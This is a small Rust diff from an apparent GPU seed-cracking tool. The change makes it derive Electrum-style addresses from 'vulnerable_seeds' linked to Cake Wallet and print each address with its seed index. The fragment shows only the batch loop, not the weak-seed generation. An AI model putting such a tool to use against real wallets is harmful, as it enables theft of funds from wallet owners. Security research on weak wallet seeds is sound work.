@@ -82,7 +82,7 @@ pub fn run_targeted() -> Result<()> {
 
         // Process GPU batch when full
         if batch.len() >= 1024 {
-            let addresses = solver.compute_batch(&batch, 0)?; // purpose=0 for Cake Wallet
+            let addresses = solver.compute_batch_electrum(&batch, 0)?; // purpose=0 for Cake Wallet Electrum
             for (i, addr) in addresses.iter().enumerate() {
                 println!("ADDRESS: {}", hex::encode(addr));
                 eprintln!("  -> Seed index: {}", vulnerable_seeds[i]);
@@ -94,7 +94,7 @@ pub fn run_targeted() -> Result<()> {
 
     // Final batch
     if !batch.is_empty() {
-        let addresses = solver.compute_batch(&batch, 0)?;
+        let addresses = solver.compute_batch_electrum(&batch, 0)?;
         for (i, addr) in addresses.iter().enumerate() {
             println!("ADDRESS: {}", hex::encode(addr));
             eprintln!("  -> Seed index: {}", vulnerable_seeds[i]);
